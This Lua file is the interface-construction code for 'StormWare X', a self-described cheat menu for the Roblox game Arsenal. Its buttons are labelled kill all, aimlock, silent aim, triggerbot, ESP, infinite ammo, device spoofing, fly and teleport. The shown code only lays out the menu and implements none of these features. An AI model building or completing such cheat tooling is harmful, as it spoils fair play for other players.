-- Gui to Lua
-- Version: 3.2

-- Instances:

local StormWareX = Instance.new("ScreenGui")
local ware = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local HomeFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local notes = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local CombatFrame = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local killall = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Free = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local used = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local Smoothlock = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local aimlock = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local lowertorso = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local random = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local triggerbot = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local Hitboxes = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local mods = Instance.new("Frame")
local UICorner_13 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")
local InfAmmo = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local FireRate = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local noRecoil = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local nospread = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local PlayerFrame = Instance.new("Frame")
local UICorner_18 = Instance.new("UICorner")
local TextLabel_8 = Instance.new("TextLabel")
local DSpoofs = Instance.new("Frame")
local UICorner_19 = Instance.new("UICorner")
local console = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local mobile = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local pc = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local none = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local TextLabel_9 = Instance.new("TextLabel")
local Others = Instance.new("Frame")
local UICorner_24 = Instance.new("UICorner")
local TextLabel_10 = Instance.new("TextLabel")
local Gravity = Instance.new("TextBox")
local UICorner_25 = Instance.new("UICorner")
local upd = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local Nonexisty = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local Sunglasses = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local Walkspeed = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local tpfly = Instance.new("Frame")
local UICorner_30 = Instance.new("UICorner")
local TextLabel_11 = Instance.new("TextLabel")
local Fly = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local tel = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local teleport = Instance.new("TextBox")
local UICorner_33 = Instance.new("UICorner")
local VisualFrame = Instance.new("Frame")
local UICorner_34 = Instance.new("UICorner")
local TextLabel_12 = Instance.new("TextLabel")
local viss = Instance.new("Frame")
local UICorner_35 = Instance.new("UICorner")
local TextLabel_13 = Instance.new("TextLabel")
local updFov = Instance.new("TextButton")
local UICorner_36 = Instance.new("UICorner")
local fov = Instance.new("TextBox")
local UICorner_37 = Instance.new("UICorner")
local box = Instance.new("TextButton")
local UICorner_38 = Instance.new("UICorner")
local CreditsFrame = Instance.new("Frame")
local UICorner_39 = Instance.new("UICorner")
local Title_2 = Instance.new("TextLabel")
local upperText = Instance.new("TextLabel")
local stormcr = Instance.new("TextLabel")
local lolcat_relative = Instance.new("TextLabel")
local SIDE = Instance.new("Frame")
local UICorner_40 = Instance.new("UICorner")
local Visuals = Instance.new("TextButton")
local Player = Instance.new("TextButton")
local Home = Instance.new("TextButton")
local Credits = Instance.new("TextButton")
local Combat = Instance.new("TextButton")
local SEPERATOR = Instance.new("TextLabel")
local PFP = Instance.new("ImageButton")
local UICorner_41 = Instance.new("UICorner")
local currName = Instance.new("TextLabel")
local rnk = Instance.new("TextLabel")

--Properties:

StormWareX.Name = "StormWare X"
StormWareX.Parent = game:WaitForChild("CoreGui")
StormWareX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
StormWareX.DisplayOrder = 999
StormWareX.IgnoreGuiInset = true

ware.Name = "ware"
ware.Parent = StormWareX
ware.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
ware.Position = UDim2.new(0, 0, -2.98023224e-08, 0)
ware.Size = UDim2.new(1, 0, 1, 0)

Title.Name = "Title"
Title.Parent = ware
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.416456461, 0, 0.00246913591, 0)
Title.Size = UDim2.new(0, 275, 0, 74)
Title.Font = Enum.Font.Sarpanch
Title.Text = "StormWare X"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 34.000
Title.TextWrapped = true

HomeFrame.Name = "HomeFrame"
HomeFrame.Parent = ware
HomeFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
HomeFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
HomeFrame.Size = UDim2.new(0, 1040, 0, 601)

UICorner.CornerRadius = UDim.new(0, 34)
UICorner.Parent = HomeFrame

TextLabel.Parent = HomeFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.234151155, 0, 0.0146322642, 0)
TextLabel.Size = UDim2.new(0, 552, 0, 50)
TextLabel.Font = Enum.Font.Nunito
TextLabel.Text = "The Best Competitive Arsenal Exploit."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

notes.Name = "notes"
notes.Parent = HomeFrame
notes.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
notes.Position = UDim2.new(0.0192307699, 0, 0.164725453, 0)
notes.Size = UDim2.new(0, 1000, 0, 442)

UICorner_2.Parent = notes

TextLabel_2.Parent = notes
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.200226963, 0, -0.00202696794, 0)
TextLabel_2.Size = UDim2.new(0, 568, 0, 50)
TextLabel_2.Font = Enum.Font.Nunito
TextLabel_2.Text = "Update V2.0.0"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = notes
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0179297999, 0, 0.289828271, 0)
TextLabel_3.Size = UDim2.new(0, 272, 0, 50)
TextLabel_3.Font = Enum.Font.Nunito
TextLabel_3.Text = "[+] Stormware Revamped V2"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

TextLabel_4.Parent = notes
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.0179297999, 0, 0.398425549, 0)
TextLabel_4.Size = UDim2.new(0, 272, 0, 50)
TextLabel_4.Font = Enum.Font.Nunito
TextLabel_4.Text = "[+] RightShift to toggle the gui"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

CombatFrame.Name = "CombatFrame"
CombatFrame.Parent = ware
CombatFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CombatFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
CombatFrame.Size = UDim2.new(0, 1040, 0, 601)
CombatFrame.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 34)
UICorner_3.Parent = CombatFrame

TextLabel_5.Parent = CombatFrame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.296220154, 0, 0.014632266, 0)
TextLabel_5.Size = UDim2.new(0, 421, 0, 50)
TextLabel_5.Font = Enum.Font.Nunito
TextLabel_5.Text = "Combat"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

killall.Name = "killall"
killall.Parent = CombatFrame
killall.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
killall.Position = UDim2.new(0.0452586412, 0, 0.682403445, 0)
killall.Size = UDim2.new(0, 84, 0, 40)
killall.Font = Enum.Font.Nunito
killall.Text = "Kill All (use knife) (synapse)"
killall.TextColor3 = Color3.fromRGB(255, 255, 255)
killall.TextScaled = true
killall.TextSize = 14.000
killall.TextWrapped = true

UICorner_4.Parent = killall

Free.Name = "Free"
Free.Parent = CombatFrame
Free.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Free.Position = UDim2.new(0.269396573, 0, 0.682403445, 0)
Free.Size = UDim2.new(0, 84, 0, 40)
Free.Font = Enum.Font.Nunito
Free.Text = "Kill All (Use knife)"
Free.TextColor3 = Color3.fromRGB(255, 255, 255)
Free.TextScaled = true
Free.TextSize = 14.000
Free.TextWrapped = true

UICorner_5.Parent = Free

used.Name = "used"
used.Parent = CombatFrame
used.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
used.Position = UDim2.new(0.0192307681, 0, 0.153078258, 0)
used.Size = UDim2.new(0, 392, 0, 208)

UICorner_6.Parent = used

TextLabel_6.Parent = used
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.298829675, 0, -0.00457220571, 0)
TextLabel_6.Size = UDim2.new(0, 177, 0, 50)
TextLabel_6.Font = Enum.Font.Nunito
TextLabel_6.Text = "Most used"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

Smoothlock.Name = "Smoothlock"
Smoothlock.Parent = used
Smoothlock.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Smoothlock.Position = UDim2.new(0.534790635, 0, 0.476394892, 0)
Smoothlock.Size = UDim2.new(0, 84, 0, 40)
Smoothlock.Font = Enum.Font.Nunito
Smoothlock.Text = "Smoothlock (press c to toggle)"
Smoothlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Smoothlock.TextScaled = true
Smoothlock.TextSize = 14.000
Smoothlock.TextWrapped = true

UICorner_7.Parent = Smoothlock

aimlock.Name = "aimlock"
aimlock.Parent = used
aimlock.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
aimlock.Position = UDim2.new(0.0452586263, 0, 0.257510722, 0)
aimlock.Size = UDim2.new(0, 84, 0, 40)
aimlock.Font = Enum.Font.Nunito
aimlock.Text = "Aimlock"
aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
aimlock.TextScaled = true
aimlock.TextSize = 14.000
aimlock.TextWrapped = true

UICorner_8.Parent = aimlock

lowertorso.Name = "lowertorso"
lowertorso.Parent = used
lowertorso.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
lowertorso.Position = UDim2.new(0.0449067503, 0, 0.476394862, 0)
lowertorso.Size = UDim2.new(0, 84, 0, 40)
lowertorso.Font = Enum.Font.Nunito
lowertorso.Text = "Silent Aim (torso)"
lowertorso.TextColor3 = Color3.fromRGB(255, 255, 255)
lowertorso.TextScaled = true
lowertorso.TextSize = 14.000
lowertorso.TextWrapped = true

UICorner_9.Parent = lowertorso

random.Name = "random"
random.Parent = used
random.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
random.Position = UDim2.new(0.29732582, 0, 0.476394862, 0)
random.Size = UDim2.new(0, 84, 0, 40)
random.Font = Enum.Font.Nunito
random.Text = "Silent Aim (Random)"
random.TextColor3 = Color3.fromRGB(255, 255, 255)
random.TextScaled = true
random.TextSize = 14.000
random.TextWrapped = true

UICorner_10.Parent = random

triggerbot.Name = "triggerbot"
triggerbot.Parent = used
triggerbot.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
triggerbot.Position = UDim2.new(0.509280443, 0, 0.267126113, 0)
triggerbot.Size = UDim2.new(0, 84, 0, 40)
triggerbot.Font = Enum.Font.Nunito
triggerbot.Text = "Triggerbot"
triggerbot.TextColor3 = Color3.fromRGB(255, 255, 255)
triggerbot.TextScaled = true
triggerbot.TextSize = 14.000
triggerbot.TextWrapped = true

UICorner_11.Parent = triggerbot

Hitboxes.Name = "Hitboxes"
Hitboxes.Parent = used
Hitboxes.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Hitboxes.Position = UDim2.new(0.269396544, 0, 0.257510722, 0)
Hitboxes.Size = UDim2.new(0, 84, 0, 40)
Hitboxes.Font = Enum.Font.Nunito
Hitboxes.Text = "Silent Aim (Head)"
Hitboxes.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitboxes.TextScaled = true
Hitboxes.TextSize = 14.000
Hitboxes.TextWrapped = true

UICorner_12.Parent = Hitboxes

mods.Name = "mods"
mods.Parent = CombatFrame
mods.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
mods.Position = UDim2.new(0.450000018, 0, 0.153078258, 0)
mods.Size = UDim2.new(0, 392, 0, 208)

UICorner_13.Parent = mods

TextLabel_7.Parent = mods
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.209543958, 0, -0.00457220804, 0)
TextLabel_7.Size = UDim2.new(0, 226, 0, 50)
TextLabel_7.Font = Enum.Font.Nunito
TextLabel_7.Text = "Gun Modifications"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

InfAmmo.Name = "InfAmmo"
InfAmmo.Parent = mods
InfAmmo.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
InfAmmo.Position = UDim2.new(0.0197484065, 0, 0.269664049, 0)
InfAmmo.Size = UDim2.new(0, 84, 0, 40)
InfAmmo.Font = Enum.Font.Nunito
InfAmmo.Text = "Infinite Ammo"
InfAmmo.TextColor3 = Color3.fromRGB(255, 255, 255)
InfAmmo.TextScaled = true
InfAmmo.TextSize = 14.000
InfAmmo.TextWrapped = true

UICorner_14.Parent = InfAmmo

FireRate.Name = "FireRate"
FireRate.Parent = mods
FireRate.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
FireRate.Position = UDim2.new(0.271595716, 0, 0.267126113, 0)
FireRate.Size = UDim2.new(0, 84, 0, 40)
FireRate.Font = Enum.Font.Nunito
FireRate.Text = "Fire Rate"
FireRate.TextColor3 = Color3.fromRGB(255, 255, 255)
FireRate.TextScaled = true
FireRate.TextSize = 14.000
FireRate.TextWrapped = true

UICorner_15.Parent = FireRate

noRecoil.Name = "noRecoil"
noRecoil.Parent = mods
noRecoil.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
noRecoil.Position = UDim2.new(0.521595716, 0, 0.267126113, 0)
noRecoil.Size = UDim2.new(0, 84, 0, 40)
noRecoil.Font = Enum.Font.Nunito
noRecoil.Text = "No Recoil"
noRecoil.TextColor3 = Color3.fromRGB(255, 255, 255)
noRecoil.TextScaled = true
noRecoil.TextSize = 14.000
noRecoil.TextWrapped = true

UICorner_16.Parent = noRecoil

nospread.Name = "nospread"
nospread.Parent = mods
nospread.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
nospread.Position = UDim2.new(0.0241467357, 0, 0.502703071, 0)
nospread.Size = UDim2.new(0, 84, 0, 40)
nospread.Font = Enum.Font.Nunito
nospread.Text = "No Spread"
nospread.TextColor3 = Color3.fromRGB(255, 255, 255)
nospread.TextScaled = true
nospread.TextSize = 14.000
nospread.TextWrapped = true

UICorner_17.Parent = nospread

PlayerFrame.Name = "PlayerFrame"
PlayerFrame.Parent = ware
PlayerFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
PlayerFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
PlayerFrame.Size = UDim2.new(0, 1040, 0, 601)
PlayerFrame.Visible = false

UICorner_18.CornerRadius = UDim.new(0, 34)
UICorner_18.Parent = PlayerFrame

TextLabel_8.Parent = PlayerFrame
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(0.297181696, 0, 0.0429184549, 0)
TextLabel_8.Size = UDim2.new(0, 421, 0, 50)
TextLabel_8.Font = Enum.Font.Nunito
TextLabel_8.Text = "LocalPlayer/FE"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true

DSpoofs.Name = "DSpoofs"
DSpoofs.Parent = PlayerFrame
DSpoofs.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
DSpoofs.Position = UDim2.new(0.0192307699, 0, 0.154742092, 0)
DSpoofs.Size = UDim2.new(0, 300, 0, 175)

UICorner_19.Parent = DSpoofs

console.Name = "console"
console.Parent = DSpoofs
console.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
console.Position = UDim2.new(-5.9068203e-05, 0, 0.608918667, 0)
console.Size = UDim2.new(0, 92, 0, 28)
console.Font = Enum.Font.Nunito
console.Text = "Spoof Device To Console"
console.TextColor3 = Color3.fromRGB(255, 255, 255)
console.TextScaled = true
console.TextSize = 14.000
console.TextWrapped = true

UICorner_20.Parent = console

mobile.Name = "mobile"
mobile.Parent = DSpoofs
mobile.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
mobile.Position = UDim2.new(-0.00209614635, 0, 0.822333276, 0)
mobile.Size = UDim2.new(0, 92, 0, 28)
mobile.Font = Enum.Font.Nunito
mobile.Text = "Spoof Device To Mobile"
mobile.TextColor3 = Color3.fromRGB(255, 255, 255)
mobile.TextScaled = true
mobile.TextSize = 14.000
mobile.TextWrapped = true

UICorner_21.Parent = mobile

pc.Name = "pc"
pc.Parent = DSpoofs
pc.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
pc.Position = UDim2.new(0.657327533, 0, 0.824950278, 0)
pc.Size = UDim2.new(0, 92, 0, 28)
pc.Font = Enum.Font.Nunito
pc.Text = "Spoof Device To PC"
pc.TextColor3 = Color3.fromRGB(255, 255, 255)
pc.TextScaled = true
pc.TextSize = 14.000
pc.TextWrapped = true

UICorner_22.Parent = pc

none.Name = "none"
none.Parent = DSpoofs
none.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
none.Position = UDim2.new(0.300926983, 0, 0.827148557, 0)
none.Size = UDim2.new(0, 92, 0, 28)
none.Font = Enum.Font.Nunito
none.Text = "Spoof Device To None"
none.TextColor3 = Color3.fromRGB(255, 255, 255)
none.TextScaled = true
none.TextSize = 14.000
none.TextWrapped = true

UICorner_23.Parent = none

TextLabel_9.Parent = DSpoofs
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0.20444192, 0, 0.000235486776, 0)
TextLabel_9.Size = UDim2.new(0, 177, 0, 50)
TextLabel_9.Font = Enum.Font.Nunito
TextLabel_9.Text = "Device Spoofs"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true

Others.Name = "Others"
Others.Parent = PlayerFrame
Others.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Others.Position = UDim2.new(0.343269259, 0, 0.148086518, 0)
Others.Size = UDim2.new(0, 300, 0, 175)

UICorner_24.Parent = Others

TextLabel_10.Parent = Others
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Position = UDim2.new(0.244441912, 0, -0.00547879888, 0)
TextLabel_10.Size = UDim2.new(0, 177, 0, 50)
TextLabel_10.Font = Enum.Font.Nunito
TextLabel_10.Text = "Others"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true

Gravity.Name = "Gravity"
Gravity.Parent = Others
Gravity.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Gravity.Position = UDim2.new(0.0285057425, 0, 0.487681001, 0)
Gravity.Size = UDim2.new(0, 122, 0, 29)
Gravity.Font = Enum.Font.SourceSans
Gravity.PlaceholderText = "Gravity"
Gravity.Text = ""
Gravity.TextColor3 = Color3.fromRGB(255, 255, 255)
Gravity.TextScaled = true
Gravity.TextSize = 24.000
Gravity.TextWrapped = true

UICorner_25.Parent = Gravity

upd.Name = "upd"
upd.Parent = Others
upd.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
upd.Position = UDim2.new(0.0829885006, 0, 0.71218133, 0)
upd.Size = UDim2.new(0, 89, 0, 22)
upd.Font = Enum.Font.Nunito
upd.Text = "Update"
upd.TextColor3 = Color3.fromRGB(255, 255, 255)
upd.TextScaled = true
upd.TextSize = 14.000
upd.TextWrapped = true

UICorner_26.Parent = upd

Nonexisty.Name = "Nonexisty"
Nonexisty.Parent = Others
Nonexisty.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Nonexisty.Position = UDim2.new(0.373045981, 0, 0.790631533, 0)
Nonexisty.Size = UDim2.new(0, 99, 0, 30)
Nonexisty.Font = Enum.Font.Nunito
Nonexisty.Text = "Turn Invisible"
Nonexisty.TextColor3 = Color3.fromRGB(255, 255, 255)
Nonexisty.TextScaled = true
Nonexisty.TextSize = 14.000
Nonexisty.TextWrapped = true

UICorner_27.Parent = Nonexisty

Sunglasses.Name = "Sunglasses"
Sunglasses.Parent = Others
Sunglasses.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Sunglasses.Position = UDim2.new(0.639683843, 0, 0.608093262, 0)
Sunglasses.Size = UDim2.new(0, 93, 0, 32)
Sunglasses.Font = Enum.Font.Nunito
Sunglasses.Text = "Sunglasses"
Sunglasses.TextColor3 = Color3.fromRGB(255, 255, 255)
Sunglasses.TextScaled = true
Sunglasses.TextSize = 14.000
Sunglasses.TextWrapped = true

UICorner_28.Parent = Sunglasses

Walkspeed.Name = "Walkspeed"
Walkspeed.Parent = Others
Walkspeed.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Walkspeed.Position = UDim2.new(0.59399426, 0, 0.413488656, 0)
Walkspeed.Size = UDim2.new(0, 106, 0, 30)
Walkspeed.Font = Enum.Font.Nunito
Walkspeed.Text = "Walkspeed"
Walkspeed.TextColor3 = Color3.fromRGB(255, 255, 255)
Walkspeed.TextScaled = true
Walkspeed.TextSize = 14.000
Walkspeed.TextWrapped = true

UICorner_29.Parent = Walkspeed

tpfly.Name = "tpfly"
tpfly.Parent = PlayerFrame
tpfly.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
tpfly.Position = UDim2.new(0.668269277, 0, 0.146422625, 0)
tpfly.Size = UDim2.new(0, 300, 0, 175)

UICorner_30.Parent = tpfly

TextLabel_11.Parent = tpfly
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(0.122988686, 0, -0.00547877699, 0)
TextLabel_11.Size = UDim2.new(0, 225, 0, 50)
TextLabel_11.Font = Enum.Font.Nunito
TextLabel_11.Text = "Teleportation & Fly"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

Fly.Name = "Fly"
Fly.Parent = tpfly
Fly.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Fly.Position = UDim2.new(0.644482791, 0, 0.836664617, 0)
Fly.Size = UDim2.new(0, 92, 0, 28)
Fly.Font = Enum.Font.Nunito
Fly.Text = "Fly (T to toggle)"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextScaled = true
Fly.TextSize = 14.000
Fly.TextWrapped = true

UICorner_31.Parent = Fly

tel.Name = "tel"
tel.Parent = tpfly
tel.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
tel.Position = UDim2.new(0.3907184, 0, 0.611306071, 0)
tel.Size = UDim2.new(0, 84, 0, 20)
tel.Font = Enum.Font.Nunito
tel.Text = "Teleport"
tel.TextColor3 = Color3.fromRGB(255, 255, 255)
tel.TextScaled = true
tel.TextSize = 14.000
tel.TextWrapped = true

UICorner_32.Parent = tel

teleport.Name = "teleport"
teleport.Parent = tpfly
teleport.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
teleport.Position = UDim2.new(0.236091956, 0, 0.408215791, 0)
teleport.Size = UDim2.new(0, 178, 0, 31)
teleport.Font = Enum.Font.SourceSans
teleport.PlaceholderText = "Teleport To:"
teleport.Text = ""
teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
teleport.TextScaled = true
teleport.TextSize = 14.000
teleport.TextWrapped = true

UICorner_33.Parent = teleport

VisualFrame.Name = "VisualFrame"
VisualFrame.Parent = ware
VisualFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
VisualFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
VisualFrame.Size = UDim2.new(0, 1040, 0, 601)
VisualFrame.Visible = false

UICorner_34.CornerRadius = UDim.new(0, 34)
UICorner_34.Parent = VisualFrame

TextLabel_12.Parent = VisualFrame
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BackgroundTransparency = 1.000
TextLabel_12.Position = UDim2.new(0.281797081, 0, 0.014632266, 0)
TextLabel_12.Size = UDim2.new(0, 421, 0, 50)
TextLabel_12.Font = Enum.Font.Nunito
TextLabel_12.Text = "Visuals"
TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.TextScaled = true
TextLabel_12.TextSize = 14.000
TextLabel_12.TextWrapped = true

viss.Name = "viss"
viss.Parent = VisualFrame
viss.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
viss.Position = UDim2.new(0.188461542, 0, 0.144758731, 0)
viss.Size = UDim2.new(0, 573, 0, 368)

UICorner_35.Parent = viss

TextLabel_13.Parent = viss
TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.BackgroundTransparency = 1.000
TextLabel_13.Position = UDim2.new(0.387687951, 0, -0.00248191669, 0)
TextLabel_13.Size = UDim2.new(0, 203, 0, 50)
TextLabel_13.Font = Enum.Font.Nunito
TextLabel_13.Text = "Visuals & FOV"
TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.TextScaled = true
TextLabel_13.TextSize = 14.000
TextLabel_13.TextWrapped = true

updFov.Name = "updFov"
updFov.Parent = viss
updFov.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
updFov.Position = UDim2.new(0.489656687, 0, 0.514076769, 0)
updFov.Size = UDim2.new(0, 84, 0, 40)
updFov.Font = Enum.Font.Nunito
updFov.Text = "Update"
updFov.TextColor3 = Color3.fromRGB(255, 255, 255)
updFov.TextScaled = true
updFov.TextSize = 14.000
updFov.TextWrapped = true

UICorner_36.Parent = updFov

fov.Name = "fov"
fov.Parent = viss
fov.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
fov.Position = UDim2.new(0.446658552, 0, 0.408763289, 0)
fov.Size = UDim2.new(0, 135, 0, 29)
fov.Font = Enum.Font.SourceSans
fov.PlaceholderText = "Arsenal FOV"
fov.Text = ""
fov.TextColor3 = Color3.fromRGB(255, 255, 255)
fov.TextScaled = true
fov.TextSize = 24.000
fov.TextWrapped = true

UICorner_37.Parent = fov

box.Name = "box"
box.Parent = viss
box.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
box.Position = UDim2.new(0.491097212, 0, 0.219467252, 0)
box.Size = UDim2.new(0, 84, 0, 40)
box.Font = Enum.Font.Nunito
box.Text = "Box ESP"
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.TextScaled = true
box.TextSize = 14.000
box.TextWrapped = true

UICorner_38.Parent = box

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = ware
CreditsFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CreditsFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
CreditsFrame.Size = UDim2.new(0, 1040, 0, 601)
CreditsFrame.Visible = false

UICorner_39.CornerRadius = UDim.new(0, 34)
UICorner_39.Parent = CreditsFrame

Title_2.Name = "Title"
Title_2.Parent = CreditsFrame
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.Position = UDim2.new(0.0452586226, 0, 0.0429184549, 0)
Title_2.Size = UDim2.new(0, 421, 0, 50)
Title_2.Font = Enum.Font.Nunito
Title_2.Text = "Stormware Credits"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextScaled = true
